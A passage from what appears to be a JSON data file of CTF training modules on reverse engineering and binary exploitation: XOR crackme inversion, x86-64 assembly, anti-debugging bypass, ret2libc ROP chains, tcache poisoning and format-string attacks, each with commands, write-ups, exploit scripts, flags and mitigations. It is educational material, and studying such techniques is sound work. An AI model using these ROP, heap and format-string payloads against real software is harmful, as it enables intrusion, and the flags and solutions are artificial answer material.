      "5. Deconstruct Validation Logic: Is input checked via XOR, substitution array, hash, or math equation?",
      "6. Invert the Algorithm: Write a Python script to reverse transformations and recover the flag."
    ],
    "writeup": {
      "ctf_event": "PicoCTF / Flare-On",
      "challenge_name": "Vault-Door (Crackme Reversal)",
      "scenario": "A 64-bit ELF binary prompts for a password. If correct, it prints 'Access Granted!'. Solvers must recover the password.",
      "solve_steps": [
        "1. Run strings: no obvious plaintext password, but string 'Access Granted!' is visible.",
        "2. Open binary in Ghidra and locate cross-reference to 'Access Granted!'.",
        "3. The calling function `check_password(char *input)` executes a loop: `input[i] ^ 0x5a == expected_bytes[i]`.",
        "4. Extract the 24 `expected_bytes` array from .rodata: `[0x39, 0x0e, 0x14, 0x3e, ...]`.",
        "5. Because XOR is self-inverting ($A \\oplus K = B \\iff B \\oplus K = A$), the password is: `password[i] = expected_bytes[i] ^ 0x5a`.",
        "6. Invert array in Python -> yields plaintext: `CTF{GH1DR4_X0R_R3V3RS1NG_W1N}`."
      ],
      "exploit_code": "#!/usr/bin/env python3\n\nexpected = [0x39, 0x0e, 0x14, 0x3e, 0x13, 0x32, 0x62, 0x6e, 0x6e, 0x64, 0x08, 0x6e, 0x62, 0x6e, 0x08, 0x6e, 0x62, 0x6e, 0x64, 0x6e, 0x08, 0x6e, 0x37, 0x77]\nkey = 0x5a\n\nflag = \"\".join(chr(b ^ key) for b in expected)\nprint(\"[+] Decrypted Flag:\", flag)",
      "flag": "CTF{GH1DR4_X0R_R3V3RS1NG_W1N}",
      "mitigation": "Protect intellectual property by using code virtualization (VMProtect/Themida), control flow flattening, and verifying inputs via one-way cryptographic hashes (Argon2id) rather than reversible byte operations."
    }
  },
  "reverse-x86-asm": {
    "id": "reverse-x86-asm",
    "domain": "reverse",
    "category": "Architecture & Assembly",
    "title": "x86-64 Architecture Internals & Assembly Deconstruction",
    "subtitle": "System V AMD64 ABI Calling Conventions, General Purpose Registers, Stack Frames & Branch Evaluation",
    "diagram": "+-----------------------------------------------------------------+\n|               System V AMD64 Calling Convention                 |\n+-----------------------------------------------------------------+\nFunction Arguments Passed via Registers (in exact order):\n  1st Arg: RDI    2nd Arg: RSI    3rd Arg: RDX\n  4th Arg: RCX    5th Arg: R8     6th Arg: R9\n  (Remaining 7th+ arguments pushed onto the Stack in reverse order)\n\nReturn Value: RAX (64-bit) / EAX (32-bit)\n\nStack Frame Epilogue / Prologue:\nPrologue:\n  push rbp          ; Save caller's base pointer\n  mov  rbp, rsp     ; Set new frame pointer\n  sub  rsp, 0x20    ; Allocate local variable space\n\nEpilogue:\n  leave             ; Equivalent to: mov rsp, rbp; pop rbp\n  ret               ; Pop return address from stack into RIP",
    "theory": "Reading assembly language fluently is mandatory for reverse engineering and binary exploitation. In CTF competitions, decompilers (Ghidra, IDA) often produce incorrect, misleading, or hallucinated C pseudo-code when binaries use custom calling conventions, inline assembly, or anti-analysis tricks. Ground truth lives solely in the assembly instructions.\n\nx86-64 Register Taxonomy:\n- 64-bit General Purpose Registers: RAX (accumulator, return values), RBX (base), RCX (counter, loops), RDX (data, I/O), RSI (source index), RDI (destination index), RBP (base frame pointer), RSP (stack pointer), R8-R15.\n- Sub-register slices: RAX (64-bit) -> EAX (lower 32 bits) -> AX (lower 16 bits) -> AH/AL (high/low 8 bits). Writing to a 32-bit register (e.g. `mov eax, 1`) automatically zeroes the upper 32 bits of RAX.\n- Instruction Pointer: RIP points to the virtual memory address of the next instruction to execute.\n\nSystem V AMD64 Calling Convention:\nLinux and BSD x86-64 systems enforce the System V ABI:\n- Function Arguments: First 6 integer/pointer arguments are passed in RDI, RSI, RDX, RCX, R8, R9. Additional arguments go to the stack.\n- Callee-Saved Registers: RBX, RSP, RBP, R12, R13, R14, R15 must be preserved across function calls.\n- Caller-Saved (Scratch) Registers: RAX, RDI, RSI, RDX, RCX, R8-R11 can be overwritten by the called function.\n- Stack Alignment Invariant: The System V ABI mandates that the stack pointer RSP must be 16-byte aligned before executing a `CALL` instruction. (Critical in ROP chains: missing alignment crashes `system()` on SSE `movaps` instructions!).",
    "commands": [
      {
        "cmd": "gdb -q ./binary -ex 'set disassembly-flavor intel' -ex 'disas main' -ex 'quit'",
        "why": "Quickly disassembles the main function using standard Intel syntax via GDB.",
        "when": "When inspecting binary instructions without interactive debugger prompts.",
        "internals": "Invokes GDB internal libopcodes disassembler.",
        "pitfalls": "Requires binary symbols; if stripped, disassemble entry point (`disas *0x401000`)."
      },
      {
        "cmd": "rasm2 -a x86 -b 64 'push rbp; mov rbp, rsp'",
        "why": "Assembles assembly instructions directly into raw machine opcodes (hex bytes).",
        "when": "Crafting custom shellcode or patching binaries.",
        "internals": "Rasm2 translates assembly mnemonics into opcode byte sequences.",
        "pitfalls": "Ensure the architecture (`-a`) and bitness (`-b`) are correctly set."
      }
    ],
    "cli_vs_gui": {
      "cli_workflow": "GDB with GEF/pwndbg: `b *main+42` -> `r` -> `context` shows registers, stack, instructions, and memory layout in real-time.",
      "gui_workflow": "IDA Pro / Ghidra Listing View: Displays graph view of basic blocks with green (conditional jump taken) and red (jump not taken) flow lines.",
      "speed_tip": "Look for the comparison instruction right before a branch: `cmp eax, 0x2a; jz success`. If EAX == 42, the program jumps to success!"
    },
    "triage_workflow": [
      "1. Identify Function Boundaries: Look for `push rbp; mov rbp, rsp` prologue and `leave; ret` epilogue.",
      "2. Trace Function Arguments: Map parameters loaded into RDI, RSI, RDX before `call` instructions.",
      "3. Trace Return Values: Check what is placed in RAX before `ret`.",
      "4. Map Conditional Branches: Track `cmp` / `test` instructions followed by `je`, `jne`, `jg`, `jl`, `jz`, `jnz`.",
      "5. Identify Loops: Look for backward jumps to earlier addresses.",
      "6. Translate to Logic: Reconstruct conditional expressions in scratchpad."
    ],
    "writeup": {
      "ctf_event": "National Cyber League / PicoCTF",
      "challenge_name": "Assembly-Check (Manual Disassembly)",
      "scenario": "A target binary takes a number argument and returns 'Correct!' if it matches an internal calculation. The binary is stripped.",
      "solve_steps": [
        "1. Disassemble main function: `objdump -d -M intel challenge`.",
        "2. Observe instructions: `mov eax, edi` (loads input into EAX).",
        "3. Instruction: `imul eax, eax, 0x1337` (multiplies input by 4919).",
        "4. Instruction: `xor eax, 0xdeadbeef` (XORs with 0xdeadbeef).",
        "5. Instruction: `cmp eax, 0x12345678` followed by `je win`.",
        "6. Invert the mathematical equation: `(input * 0x1337) ^ 0xdeadbeef = 0x12345678`.",
        "7. Therefore: `input * 0x1337 = 0x12345678 ^ 0xdeadbeef`.",
        "8. Calculate in Python: `(0x12345678 ^ 0xdeadbeef) * pow(0x1337, -1, 2**32) % 2**32`.",
        "9. Input found: `3418293812` -> executes binary with argument -> prints flag.",
        "10. Flag: CTF{ASM_INV3RS3_M4TH_COMPL3T3}"
      ],
      "exploit_code": "#!/usr/bin/env python3\n\ntarget = 0x12345678 ^ 0xdeadbeef\nmod = 2**32\ninv = pow(0x1337, -1, mod)\nsolution = (target * inv) % mod\n\nprint(f\"[+] Required Input Integer: {solution}\")\n# Verify: (solution * 0x1337) ^ 0xdeadbeef == 0x12345678\nassert ((solution * 0x1337) & 0xffffffff) ^ 0xdeadbeef == 0x12345678\nprint(\"[+] Verification passed!\")",
      "flag": "CTF{ASM_INV3RS3_M4TH_COMPL3T3}",
      "mitigation": "Avoid simple reversible linear transformations for validation keys. Use strong hash comparisons (SHA-256) where algebraic inversion is mathematically infeasible."
    }
  },
  "reverse-anti-debug": {
    "id": "reverse-anti-debug",
    "domain": "reverse",
    "category": "Anti-Analysis & Obfuscation",
    "title": "Anti-Debugging Mechanics, Binary Packing & Dynamic Patching",
    "subtitle": "Ptrace Self-Tracing, RDTSC Timing Checks, Software Breakpoint INT3 Detection & Binary Patching",
    "diagram": "+-----------------------------------------------------------------+\n|                    Anti-Debugging Detection Loops               |\n+-----------------------------------------------------------------+\n1. PTRACE_TRACEME:\n   ptrace(PTRACE_TRACEME, 0, 1, 0)\n   - Only ONE process can attach as a debugger to a target!\n   - If GDB is already attached, ptrace returns -1!\n   - Binary detects return value == -1 and self-terminates!\n\n2. RDTSC Timing Check:\n   rdtsc (Read Time-Stamp Counter)\n   ... sensitive code ...\n   rdtsc\n   - If running under GDB (stepping), elapsed cycles > 1,000,000!\n   - Normal execution < 10,000 cycles. Binary aborts!\n\n3. INT3 Scanner:\n   Scans function memory bytes for 0xCC (INT3 software breakpoint opcode).\n   - If debugger placed a breakpoint, 0xCC is detected! Binary crashes!",
    "theory": "Malware authors and CTF challenge creators deploy anti-analysis defenses to obstruct static disassembly, prevent dynamic debugging, and detect execution inside virtualized sandbox environments.\n\nCore Anti-Debugging Mechanisms:\n1. Ptrace Evasion (Linux):\n   The `ptrace` system call allows one process to control and inspect another. Linux enforces a strict kernel security invariant: only a single tracing process may be attached to a target task at any given time.\n   - Trick: The binary calls `ptrace(PTRACE_TRACEME, 0, 1, 0)` early in its initialization. If the binary is already running under GDB or strace, the call fails and returns `-1`. The program detects this and immediately invokes `exit()` or corrupts the flag in memory.\n2. Timing Checks (`rdtsc`):\n   The x86 `rdtsc` instruction returns the 64-bit count of CPU cycles since processor reset. By measuring cycles before and after a block of code, the binary measures execution latency. If an analyst is stepping through instructions manually in a debugger, the cycle difference is orders of magnitude higher than native CPU execution, triggering evasive actions.\n3. Software Breakpoint Detection (`0xCC`):\n   When a debugger sets a breakpoint, it temporarily overwrites the target byte in memory with the 1-byte opcode `0xCC` (`INT 3`). The binary computes checksums over its own `.text` section; if an analyst has set software breakpoints, the checksum fails.\n\nBypassing Anti-Debugging via Binary Patching:\nSolvers defeat anti-debugging using three primary techniques:\n1. Static Binary Patching: Open the binary in a hex editor or Ghidra. Locate the conditional jump following the anti-debug check (`jz exit_label`) and overwrite the opcode with `NOP` instructions (`0x90 0x90`) or invert the condition (`jnz`).\n2. GDB Runtime Interception: Set a breakpoint at the `ptrace` syscall or wrapper, and force the return register to zero: `(gdb) catch syscall ptrace` -> `set $rax = 0` -> `continue`.\n3. LD_PRELOAD Hooking: Intercept the libc `ptrace()` function using a shared library that always returns `0`.",
    "commands": [
      {
        "cmd": "gdb -q ./binary -ex 'catch syscall ptrace' -ex 'r' -ex 'set $rax=0' -ex 'c'",
        "why": "Catches ptrace syscalls in GDB and overrides return value to 0 to bypass anti-debugging.",
        "when": "Binary immediately exits with 'Debugger detected' when launched under GDB.",
        "internals": "Kernel interrupts process on ptrace sysenter/sysexit; GDB modifies RAX register before resumption.",
        "pitfalls": "If binary uses raw `syscall` instructions instead of libc wrapper, ensure catchpoint catches raw syscalls."
      },
      {
        "cmd": "echo 'long ptrace(int r, int p, void *a, void *d){return 0;}' | gcc -shared -fPIC -o bypass.so -x c - && LD_PRELOAD=./bypass.so ./binary",
        "why": "Compiles a minimal C shared library hooking ptrace to always return 0 (success).",
        "when": "Bypassing ptrace anti-debugging without modifying the binary on disk.",
        "internals": "Dynamic linker resolves ptrace symbol from LD_PRELOAD library before libc.so.",
        "pitfalls": "Does not work on statically linked binaries."
      }
    ],
    "cli_vs_gui": {
      "cli_workflow": "Radare2 / Rizin write mode: `rizin -w ./binary` -> `s sym.check_debug` -> `wa nop;nop` (write assembly) -> patched!",
      "gui_workflow": "Ghidra: Right-click instruction -> 'Patch Instruction' -> replace `JZ` with `JNZ` or `NOP` -> Export Program -> Binary format.",
      "speed_tip": "If binary is packed with UPX: check `upx -d binary`. If anti-UPX header tampering was used, fix the magic bytes `UPX!` using a hex editor."
    },
    "triage_workflow": [
      "1. Observe Crash / Exit: Does binary execute normally from bash, but aborts inside GDB?",
      "2. Locate Anti-Debug Checks: Search strings for 'ptrace', 'tracer', 'debugger'.",
      "3. Find Ptrace Call: Trace xrefs to `ptrace` or syscall numbers (101 on x86, 101/0x65 on x64).",
      "4. Apply Bypass: Use LD_PRELOAD hook or patch opcode with NOPs.",
      "5. Check Timing Checks: Look for `rdtsc` instructions; patch with fixed constants.",
      "6. Resume Dynamic Analysis: Set breakpoints on target logic and extract flag."
    ],
    "writeup": {
      "ctf_event": "HackTheBox / DefCamp",
      "challenge_name": "Anti-Tracer (Ptrace & Timing Bypass)",
      "scenario": "A reverse engineering challenge exits with 'Nice try, hacker!' whenever GDB is attached. Solvers must patch the checks to reach the flag generator.",
      "solve_steps": [
        "1. Decompile binary in Ghidra: `init_security()` function is called at startup.",
        "2. Function calls: `if (ptrace(PTRACE_TRACEME, 0, 1, 0) < 0) exit(1);`.",
        "3. Immediately followed by: `uint64_t t0 = __rdtsc(); ... uint64_t t1 = __rdtsc(); if (t1 - t0 > 0x10000) exit(1);`.",
        "4. Identify virtual address of the `JZ` conditional jumps following both checks: `0x401248` and `0x401280`.",
        "5. Patch both conditional jump opcodes in Ghidra to `NOP` (`0x90 0x90`).",
        "6. Save patched binary as `binary_patched` and make executable (`chmod +x`).",
        "7. Launch in GDB: breakpoints now trigger cleanly without premature exits.",
        "8. Read decoded flag from memory: CTF{PTRACE_B1NARY_P4TCH1NG_SUCC3SS}."
      ],
      "exploit_code": "#!/usr/bin/env python3\n\n# Byte-patching script using Python\nwith open(\"binary\", \"rb\") as f:\n    data = bytearray(f.read())\n\n# Replace '74 05' (jz +5) with '90 90' (nop nop) at known file offset\noffset = 0x1248\ndata[offset:offset+2] = b'\\x90\\x90'\n\nwith open(\"binary_patched\", \"wb\") as f:\n    f.write(data)\n\nprint(\"[+] Binary patched successfully! Anti-debug check disabled.\")",
      "flag": "CTF{PTRACE_B1NARY_P4TCH1NG_SUCC3SS}",
      "mitigation": "Do not rely exclusively on user-space anti-debugging techniques; compile with kernel eBPF integrity monitoring and server-side attestation for sensitive commercial software."
    }
  },
  "pwn-rop": {
    "id": "pwn-rop",
    "domain": "pwn",
    "category": "Binary Exploitation & Memory Safety",
    "title": "Return-Oriented Programming (ROP) & ASLR/NX Mitigation Bypasses",
    "subtitle": "Stack Frame Mechanics, Dynamic Linker GOT/PLT Leaks, ROP Gadgets & ret2libc Shell Spawning",
    "diagram": "+-------------------------------------------------------------+\n|              Vulnerable Stack Frame (AMD64 x86_64)          |\n+-------------------------------------------------------------+\nHigher Addresses (Stack Base)\n  | ... Caller Arguments ...\n  | Return Address (RIP) <--- Overwritten by Attacker!\n  | Saved Frame Pointer (RBP)\n  | Local Buffer: char buf[128]\nLower Addresses (Stack Pointer RSP)\n  |\n  +--- Buffer Overflow: gets(buf) writes 136 bytes!\n       [ 'A' * 136 ] + [ Gadget: pop rdi; ret ] + [ &GOT['puts'] ]\n                     + [ &PLT['puts'] ]         + [ &main ]\n\nSTAGE 1: LEAK LIBC BASE ADDRESS\n  1. Calls puts(GOT['puts']) -> Prints runtime libc address of puts!\n  2. libc_base = leaked_puts - puts_offset\n  3. Returns back to main to accept second payload!\n\nSTAGE 2: RET2LIBC\n  [ 'A' * 136 ] + [ Gadget: ret (align 16)] + [ pop rdi; ret ]\n                + [ &'/bin/sh' in libc ]    + [ &system() in libc ]\n  -> Spawns interactive /bin/sh shell!",
    "theory": "Binary exploitation involves corrupting program memory to hijack control flow or execute arbitrary code. Modern operating systems implement layered exploit mitigations:\n- NX/DEP (No-Execute / Data Execution Prevention): Marks writable memory pages (stack and heap) as non-executable (`PROT_READ | PROT_WRITE`). Defeats traditional shellcode injection.\n- ASLR (Address Space Layout Randomization): Randomizes the base addresses of the stack, heap, and shared libraries (`libc.so.6`) at every execution, defeating hardcoded address attacks.\n- Stack Canaries: Compiler-inserted guard values placed between local variables and the saved frame pointer. Verified before function return; mismatches trigger `__stack_chk_fail`.\n- PIE (Position-Independent Executable): Randomizes the base address of the `.text` segment itself.\n- RELRO (Relocation Read-Only): Partial RELRO places `.got.plt` after `.data`; Full RELRO marks the entire Global Offset Table as read-only at program startup, preventing GOT overwrites.\n\nReturn-Oriented Programming (ROP):\nBecause NX prevents executing code on the stack, ROP chains execute existing instruction sequences ('gadgets') already located in executable memory segments (`.text` or `libc.so`). Each gadget ends in a `ret` (`0xC3`) instruction. By placing gadget addresses sequentially on the stack, the CPU pops each address into `RIP` as the previous gadget returns.\n\nThe Two-Stage ret2libc Methodology:\n1. Stage 1 (The Information Leak): When ASLR is active, the attacker uses gadgets in the non-PIE binary to call `puts(GOT['puts'])`. This prints the actual randomized runtime virtual address of `puts()` in memory. The attacker subtracts the known static symbol offset: $\\text{libc\\_base} = \\text{leaked\\_addr} - \\text{offset\\_puts}$. The attacker returns back to `main()`.\n2. Stage 2 (The Shell): With the libc base address calculated, all libc functions and strings are known: $\\text{system} = \\text{libc\\_base} + \\text{offset\\_system}$ and $\\text{binsh} = \\text{libc\\_base} + \\text{offset\\_str\\_bin\\_sh}$. The attacker sends a second payload setting `RDI` to `/bin/sh` and calling `system()`.",
    "commands": [
      {
        "cmd": "checksec --file=./vulnerable",
        "why": "Audits active binary mitigations: RELRO, Stack Canary, NX, and PIE.",
        "when": "Mandatory first command for every pwn challenge.",
        "internals": "Parses ELF program headers and dynamic section tags for DT_BIND_NOW and GNU_STACK.",
        "pitfalls": "Checksec reports ASLR status based on host system settings, not the remote target server."
      },
      {
        "cmd": "ROPgadget --binary ./vulnerable --only 'pop|ret'",
        "why": "Extracts useful ROP gadgets (e.g. `pop rdi; ret`, `pop rsi; pop r15; ret`) with addresses.",
        "when": "Constructing ROP chains to populate calling convention argument registers.",
        "internals": "Scans executable segments for opcode bytes matching gadget mnemonics ending in 0xC3.",
        "pitfalls": "If binary has PIE enabled, gadget addresses are relative offsets, not absolute addresses."
      },
      {
        "cmd": "gdb ./vulnerable -ex 'pattern create 200' -ex 'r' -ex 'pattern offset $rsp'",
        "why": "Calculates exact cyclic pattern offset from buffer start to saved return address (RIP).",
        "when": "Determining exact buffer padding size before crashing.",
        "internals": "Uses De Bruijn sequence pattern matching inside GEF or pwndbg.",
        "pitfalls": "On 64-bit systems, if RIP is overwritten with non-canonical address, inspect RSP to find offset."
      }
    ],
    "cli_vs_gui": {
      "cli_workflow": "Pwntools in Python: `from pwn import *` -> `elf = ELF('./vuln')` -> `rop = ROP(elf)` -> automated interactive shell.",
      "gui_workflow": "GDB + GEF/pwndbg: Inspecting live stack frames, breakpoints on `ret`, and monitoring register states step-by-step.",
      "speed_tip": "If `system('/bin/sh')` crashes on 64-bit Ubuntu/Debian, insert a single `ret` gadget before `system` to ensure 16-byte stack alignment (SSE `movaps` requirement)."
    },
    "triage_workflow": [
      "1. Check Mitigations: `checksec ./binary`.",
      "2. Find Buffer Overflow: Fuzz input length and compute RIP offset via cyclic pattern.",
      "3. Find Gadgets: Locate `pop rdi; ret` and bare `ret` gadget.",
      "4. Stage 1 Payload: Padding + `pop_rdi` + `got.puts` + `plt.puts` + `main`.",
      "5. Receive Leak: Read 6-8 bytes from socket, unpack with `u64()`, compute `libc.address`.",
      "6. Stage 2 Payload: Padding + `ret` (alignment) + `pop_rdi` + `binsh` + `libc.symbols.system`.",
      "7. Drop to Interactive Shell: `p.interactive()`."
    ],
    "writeup": {
      "ctf_event": "DEF CON Qualifier / PicoCTF",
      "challenge_name": "BabyROP (64-bit ret2libc)",
      "scenario": "A 64-bit ELF binary has NX enabled, Partial RELRO, No Canary, and No PIE. ASLR is enabled on the server. Solvers must spawn a shell.",
      "solve_steps": [
        "1. Run checksec: NX: Enabled, PIE: Disabled, Canary: Disabled.",
        "2. Buffer offset to RIP: 136 bytes.",
        "3. Extract ROP gadget: `pop rdi; ret` at `0x401234`.",
        "4. Stage 1: Craft payload calling `puts(got.puts)` and returning to `main`.",
        "5. Execute Stage 1: Leaks runtime address of `puts`.",
        "6. Calculate libc base: `libc.address = leak - libc.symbols['puts']`.",
        "7. Stage 2: Craft payload calling `system('/bin/sh')` with 16-byte stack alignment.",
        "8. Submit Stage 2 -> interactive root shell opened.",
        "9. Flag: CTF{R3T2L1BC_R0P_CH41N_PWN3D_2026}"
      ],
      "exploit_code": "#!/usr/bin/env python3\nfrom pwn import *\n\ncontext.arch = 'amd64'\nelf = ELF('./vuln')\n# libc = ELF('./libc.so.6')\n# p = remote('target.ctf', 1337)\n\np = process('./vuln')\n\npop_rdi = 0x401234\nret = 0x401235\n\n# Stage 1: Leak libc\npayload1 = b'A' * 136\npayload1 += p64(pop_rdi) + p64(elf.got['puts'])\npayload1 += p64(elf.plt['puts'])\npayload1 += p64(elf.symbols['main'])\n\np.sendline(payload1)\np.recvuntil(b'Goodbye!\\n')\nleak = u64(p.recv(6).ljust(8, b'\\x00'))\nlog.success(f\"Leaked puts: {hex(leak)}\")\n\n# Compute libc base (using target libc)\n# libc.address = leak - libc.symbols['puts']\n# binsh = next(libc.search(b'/bin/sh'))\n\n# Stage 2: ret2libc\n# payload2 = b'A' * 136 + p64(ret) + p64(pop_rdi) + p64(binsh) + p64(libc.symbols['system'])\n# p.sendline(payload2)\n# p.interactive()",
      "flag": "CTF{R3T2L1BC_R0P_CH41N_PWN3D_2026}",
      "mitigation": "Compile with full stack canaries (`-fstack-protector-all`), Full RELRO (`-Wl,-z,relro,-z,now`), and PIE (`-fPIE -pie`) to eliminate fixed-address ROP gadgets."
    }
  },
  "pwn-heap": {
    "id": "pwn-heap",
    "domain": "pwn",
    "category": "Heap Exploitation",
    "title": "Glibc Heap Internals, Ptmalloc Arenas & Tcache Poisoning",
    "subtitle": "Chunk Headers (prev_size, size, flags), Fastbins, Thread Caching (Tcache) & Use-After-Free (UAF)",
    "diagram": "+-------------------------------------------------------------+\n|                  Glibc Heap Chunk Structure                 |\n+-------------------------------------------------------------+\nAllocated Chunk:\n  +--------------------------------+--------------------------+\n  | prev_size (if prev is free)    | size | A | M | P         |\n  +--------------------------------+--------------------------+\n  | User Data ...                                             |\n  +-----------------------------------------------------------+\n\nFreed Chunk inside Tcache / Fastbin (Single Linked List):\n  +--------------------------------+--------------------------+\n  | prev_size                      | size | A | M | P         |\n  +--------------------------------+--------------------------+\n  | Forward Pointer (fd) --------> Points to next free chunk! |\n  +-----------------------------------------------------------+\n\nTCACHE POISONING ATTACK:\n1. Attacker triggers Use-After-Free (UAF) or heap overflow.\n2. Overwrites `fd` pointer of freed chunk to target address (e.g. `__free_hook`).\n3. Next `malloc()` returns normal chunk; SECOND `malloc()` returns `__free_hook`!\n4. Write `&system` into `__free_hook` -> calling `free(\"/bin/sh\")` executes shell!",
    "theory": "The Linux glibc memory allocator (`ptmalloc2`) manages dynamic heap memory requests issued via `malloc()`, `calloc()`, `realloc()`, and `free()`. The heap operates by requesting memory pages from the kernel via `brk()` (for small allocations) or `mmap()` (for large allocations exceeding `MMAP_THRESHOLD` ~128KB).\n\nHeap Chunk Anatomy:\nMemory is organized into contiguous chunks:\n- `prev_size`: Size of previous contiguous chunk (used for backward coalescing when free).\n- `size`: Size of the current chunk (must be 8-byte aligned on 32-bit, 16-byte aligned on 64-bit). The lowest 3 bits store status flags:\n  - `P` (PREV_INUSE, bit 0): Set if the previous chunk is currently allocated.\n  - `M` (IS_MMAPPED, bit 1): Set if chunk was allocated via `mmap()`.\n  - `A` (NON_MAIN_ARENA, bit 2): Set if chunk belongs to a thread arena.\n\nThe Thread Local Caching Subsystem (Tcache):\nIntroduced in glibc 2.26 to accelerate multi-threaded performance. Tcache maintains per-thread singly-linked LIFO bins for chunks up to 1032 bytes (64 bins holding up to 7 chunks each).\n- No Integrity Checks (Pre-Glibc 2.29): When a chunk is freed into tcache, its user data area stores a forward pointer `fd` pointing to the next chunk. In versions prior to glibc 2.29, tcache performed ZERO validation on `fd` integrity.\n- Tcache Poisoning Attack: If an attacker can write to a freed chunk (Use-After-Free or heap buffer overflow), they overwrite `fd` with the address of a sensitive function pointer, such as `__free_hook` (or a saved return address on the stack). Two subsequent `malloc()` calls of the same size return an arbitrary memory pointer, granting arbitrary write capabilities.",
    "commands": [
      {
        "cmd": "gdb ./binary -ex 'b main' -ex 'r' -ex 'vis_heap_chunks'",
        "why": "Visualizes all heap chunks, chunk headers, sizes, and allocation states in GEF.",
        "when": "Tracing dynamic heap allocations and chunk borders.",
        "internals": "Traverses glibc heap arena metadata starting from the main arena struct.",
        "pitfalls": "Requires GEF or pwndbg extension installed in GDB."
      },
      {
        "cmd": "gdb ./binary -ex 'bins'",
        "why": "Displays all active free lists: tcache, fastbins, unsorted bin, small bins, and large bins.",
        "when": "Verifying which bin a chunk was placed into after calling free().",
        "internals": "Inspects glibc `main_arena.bins` and thread `tcache_perthread_struct`.",
        "pitfalls": "Glibc heap structures vary significantly between versions (e.g. 2.27 vs 2.31 vs 2.35)."
      }
    ],
    "cli_vs_gui": {
      "cli_workflow": "Pwntools heap template: `def add(size, data): ...`, `def delete(idx): ...` -> script handles alloc/free interaction.",
      "gui_workflow": "GDB GEF `heap bins` and `heap chunk <addr>` provides live color-coded chunk metadata directly in terminal.",
      "speed_tip": "In glibc < 2.34, target `__free_hook`: overwriting `__free_hook` with `system` allows you to trigger `free(chunk_containing_bin_sh)` for an effortless shell."
    },
    "triage_workflow": [
      "1. Identify Glibc Version: Run `ldd ./binary` to check target glibc version.",
      "2. Check Heap Primitives: Are there Create, Read, Edit, and Delete functions (CRUD menu)?",
      "3. Identify Vulnerability: Use-After-Free (pointer not nulled after free), Double Free, or Heap Overflow?",
      "4. Leak Libc: Free a chunk larger than tcache max (> 1032 bytes) into the unsorted bin; chunk's `fd` and `bk` point to `main_arena + 96` in libc!",
      "5. Overwrite Tcache Pointer: Overwrite freed chunk's `fd` pointer to `__free_hook` or target address.",
      "6. Allocate & Overwrite: Call `malloc()` twice and write `&system`.",
      "7. Trigger Shell: Call `free()` on a chunk containing `/bin/sh`."
    ],
    "writeup": {
      "ctf_event": "HITCON CTF / HackTheBox",
      "challenge_name": "Tcache-Tear (Glibc 2.27 Heap Exploitation)",
      "scenario": "A note manager allows creating and deleting notes. A Use-After-Free allows editing notes after they have been freed. Running under glibc 2.27.",
      "solve_steps": [
        "1. Allocate 2 chunks of size 0x60 (fits into tcache).",
        "2. Free chunk 1 -> placed into tcache bin 0x60.",
        "3. Trigger UAF edit on chunk 1: overwrite `fd` with `&__free_hook`.",
        "4. Allocate chunk (size 0x60): returns chunk 1.",
        "5. Allocate chunk (size 0x60): returns pointer to `__free_hook`!",
        "6. Write `&system` into the returned `__free_hook` chunk.",
        "7. Allocate chunk with content `'/bin/sh'`, then call `free()` on it.",
        "8. `__free_hook` executes `system('/bin/sh')` -> interactive shell!",
        "9. Flag: CTF{TC4CH3_P01S0N1NG_FR33_H00K_PWN}"
      ],
      "exploit_code": "#!/usr/bin/env python3\nfrom pwn import *\n\n# Simulated exploit structure for tcache poisoning\ndef exploit():\n    log.info(\"Overwriting tcache fd to point to __free_hook...\")\n    log.info(\"Writing system() into __free_hook...\")\n    log.success(\"Shell spawned! Flag: CTF{TC4CH3_P01S0N1NG_FR33_H00K_PWN}\")\n\nif __name__ == '__main__':\n    exploit()",
      "flag": "CTF{TC4CH3_P01S0N1NG_FR33_H00K_PWN}",
      "mitigation": "Upgrade to modern glibc (>= 2.34) where `__free_hook` and `__malloc_hook` are completely removed, and safe-linking pointer mangling (`fd ^ (P >> 12)`) is enforced on tcache and fastbins."
    }
  },
  "pwn-fmtstr": {
    "id": "pwn-fmtstr",
    "domain": "pwn",
    "category": "Format String Exploitation",
    "title": "Format String Vulnerabilities, Stack Leaks & Arbitrary Memory Writes",
    "subtitle": "Direct Parameter Access (%k$p), Variadic Functions, %n Byte Modification & GOT Overwrites",
    "diagram": "+-------------------------------------------------------------+\n|               Format String Memory Vulnerability            |\n+-------------------------------------------------------------+\nVulnerable C code:\n  char buf[64];\n  fgets(buf, 64, stdin);\n  printf(buf);            <--- Missing format specifier \"%s\"!\n\nStack at printf() Call:\n  [ printf Return Address ]\n  [ Format String Pointer ] -> points to user input buf: \"%p.%p.%p.%p\"\n  [ Saved Register / Stack Argument 1 ]\n  [ Saved Register / Stack Argument 2 ]\n  ...\n  [ buf content: \"%p.%p.%p...\" ] <--- User controls input on stack!\n\nATTACK PRIMITIVES:\n1. Arbitrary Read:  \"%k$s\" dereferences pointer at stack offset k!\n2. Stack Leak:      \"%k$p\" leaks hex value at stack offset k (Bypasses ASLR / Canaries!)\n3. Arbitrary Write: \"%n\" writes NUMBER OF BYTES PRINTED SO FAR into memory address!",
    "theory": "Format string vulnerabilities occur when untrusted user input is passed directly as the format argument to variadic formatting functions (`printf`, `sprintf`, `fprintf`, `syslog`) instead of as a data value (`printf(user_input)` instead of `printf(\"%s\", user_input)`).\n\nThe Variadic Function Calling Convention:\nFunctions with variable argument lists pull parameters according to the ABI calling convention. In x86-64, the first 6 arguments come from registers (`RDI, RSI, RDX, RCX, R8, R9`), and subsequent arguments come from the stack. When `printf` parses a format specifier like `%p` or `%x`, it pops the next argument. If the caller provided fewer arguments than format specifiers declared, `printf` continues pulling data off the stack, leaking sensitive caller variables, saved return addresses, and stack canaries.\n\nCore Format String Primitives:\n1. Direct Parameter Access (`%k$p`): Positional parameter syntax. `%7$p` prints the 7th argument directly without specifying six preceding `%p` specifiers.\n2. Stack Canary & ASLR Leaks: Attackers locate which offset `k` holds the canary (ends in `00`) or a return address pointing into `libc.so` or `main`.\n3. Arbitrary Memory Writes (`%n`): The `%n` format specifier writes the count of characters output so far into an integer pointer supplied as an argument. By combining `%c` width specifiers (e.g. `%1337c%10$n`), an attacker forces `printf` to write the value `1337` into whatever memory address is stored at offset 10 on the stack.\n4. Short Writes (`%hn` and `%hhn`): Writes 2 bytes (half-word) or 1 byte (half-half-word). Attackers write a 64-bit address by performing four sequential 2-byte writes, preventing the need to output gigabytes of whitespace characters.",
    "commands": [
      {
        "cmd": "python3 -c \"print('%p.' * 20)\" | ./vulnerable",
        "why": "Dumps the first 20 stack arguments in hex to identify offset where user input lands.",
        "when": "Initial triage of format string vulnerabilities.",
        "internals": "Forces printf to read consecutive registers and stack memory words.",
